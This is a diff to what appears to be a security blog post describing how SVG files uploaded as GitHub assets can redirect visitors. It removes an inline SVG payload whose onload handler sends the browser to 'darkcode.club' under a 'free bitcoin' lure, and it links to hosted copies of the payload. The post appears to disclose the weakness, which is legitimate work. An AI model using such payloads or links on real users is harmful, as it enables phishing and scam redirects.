@@ -83,12 +83,10 @@ When you access a URL that has been infected with a payload, your browser will s
 
 You can test it for yourself by entering this super secure link from the GitHub repository: https://github.com/github/ruby/assets/45472156/bf9410cf-232d-450a-bf61-d1209ee0637e
 
-And with this payload ```svg <svg xmlns="http://www.w3.org/2000/svg" width="200" height="50" viewBox="0 0 200 50" onload="window.location.href = 'darkcode.club';">
-  <rect width="100%" height="100%" fill="#3498db"/>
-  <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="16" font-family="Arial, sans-serif">Click here, free bitcoin</text>
-</svg>```
+And with this payload ![image](https://github.com/GabrielPrzybysz/gabeblog/assets/45472156/56cfd044-fb93-4742-8346-b4cf732153bd)
 
-https://github.com/github/ruby/assets/45472156/b56b6c50-6ce7-4121-b367-8f96311fc86e
+
+![a](https://github.com/github/ruby/assets/45472156/b56b6c50-6ce7-4121-b367-8f96311fc86e)
 
 You can redirect anyone to any website.
 
